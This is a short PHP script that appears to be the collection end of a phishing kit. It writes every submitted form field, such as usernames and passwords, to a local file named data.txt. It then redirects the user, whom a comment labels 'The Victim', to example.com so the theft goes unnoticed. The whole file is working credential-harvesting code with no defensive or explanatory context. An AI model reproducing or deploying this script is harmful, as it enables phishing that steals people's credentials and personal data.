<?php
	file_put_contents("data.txt", implode("\n \n", $_POST) , FILE_APPEND | LOCK_EX );
	//Redirect The Victim
	header("location:http://example.com");
 ?>